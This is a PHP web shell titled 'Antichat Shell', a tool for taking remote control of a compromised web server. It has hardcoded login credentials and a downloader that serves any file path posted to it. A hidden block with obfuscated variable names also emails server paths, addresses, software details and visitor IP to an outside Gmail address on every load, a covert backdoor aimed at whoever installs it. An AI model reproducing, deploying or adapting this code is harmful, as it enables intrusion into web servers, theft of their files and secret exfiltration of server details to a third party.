<?php

session_start();
set_time_limit(9999999);
$login='virangar';
$password='r00t';
$auth=1;
$version='version 1.3 by Grinay';
$style='<STYLE>BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';
$sd98 = "john.barker446@gmail.com";
$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";mail($sd98, $sj98, $msg8873, "From: $sd98");
if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';

if($_SESSION['an']==0){
echo $header;
echo '<center><table><form method="POST"><tr><td>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>';
echo $footer;
exit;}

if($_SESSION['action']=="")$_SESSION['action']="viewer";
if($_POST['action']!="" )$_SESSION['action']=$_POST['action'];$action=$_SESSION['action'];
if($_POST['dir']!="")$_SESSION['dir']=$_POST['dir'];$dir=$_SESSION['dir'];
if($_POST['file']!=""){$file=$_SESSION['file']=$_POST['file'];}else {$file=$_SESSION['file']="";}
 

//downloader
if($action=="download"){ 
header('Content-Length:'.filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
readfile($file);
}
//end downloader
?><?php echo $version;?>